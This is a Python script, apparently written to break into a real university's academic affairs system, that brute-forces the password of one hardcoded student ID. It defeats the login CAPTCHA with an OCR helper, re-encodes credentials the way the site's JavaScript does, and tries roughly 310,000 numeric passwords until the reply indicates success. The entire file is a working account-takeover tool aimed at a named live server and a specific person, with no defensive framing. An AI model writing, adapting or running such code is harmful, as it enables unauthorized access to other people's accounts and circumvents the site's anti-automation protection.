import requests
import js2py
import ImgMain
import sys
class Baolipaojie:
    s=requests.Session()
    xjkpurl='http://jwxt.upc.edu.cn/jsxsd/grxx/xsxx?Ves632DSdyV=NEW_XSD_XJCJ'
    headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Content-Length': '61',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'jwxt.upc.edu.cn',
        'Origin': 'http://jwxt.upc.edu.cn',
        'Proxy-Connection': 'keep-alive',
        'Referer': 'http://jwxt.upc.edu.cn/jsxsd/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4209.2 Safari/537.36'
    }
    headers1={
        'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Host': 'jwxt.upc.edu.cn',
        'Proxy-Connection': 'keep-alive',
        'Referer': 'http://jwxt.upc.edu.cn/jsxsd/xk/LoginToXk',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4209.2 Safari/537.36'
    }
    def __init__(self,user,password):
        self.user=user
        self.password=password

    def login(self):
        url='http://jwxt.upc.edu.cn/jsxsd/xk/LoginToXk'
        enus=self.encodepost(self.user)
        enps=self.encodepost(self.password)
        encodeurl=enus+'%%%'+enps
        #print(encodeurl)
        data={
            'encoded':encodeurl,
            'RANDOMCODE':self.vercode
        }
        res=self.s.post(url,headers=self.headers,data=data)
        res=res.text
        #print(res)
        return res

    def getver(self):
        url='http://jwxt.upc.edu.cn/jsxsd/verifycode.servlet'
        res=self.s.get(url,headers=self.headers1)
        content=res.content
        # f=open('./vercode.jpg','wb')
        # f.write(content)
        # f.close()
        self.vercode=ImgMain.main(content)
        print(self.vercode)

    def encodepost(self,u):
        js="""
        function encodeInp(input) {
            var output = "";
            var chr1, chr2, chr3 = "";
            var enc1, enc2, enc3, enc4 = "";
            var i = 0;
            do {
                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);
                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;
                if (isNaN(chr2)) {
                    enc3 = enc4 = 64
                } else if (isNaN(chr3)) {
                    enc4 = 64
                }
                output = output + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(enc1) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(enc2) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(enc3) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(enc4);
                chr1 = chr2 = chr3 = "";
                enc1 = enc2 = enc3 = enc4 = ""
            } while ( i < input . length );
            return output
        }
        """
        res=js2py.eval_js(js)
        return res(u)

if __name__ == "__main__":
    user='2004020308'
    m=31
    while m>0:
        n=9999
        while n>0:
            i='%02d'%m
            h='%04d'%n
            password=str(i)+str(h)
            print(password)

            baoli=Baolipaojie(user,password)
            baoli.getver()
            result=baoli.login()
            if result.find('修改密码')!=-1:
                print('登陆成功')
                print(password)
                sys.exit(0)
            else:
                print('登陆失败')
            n=n-1
        m=m-1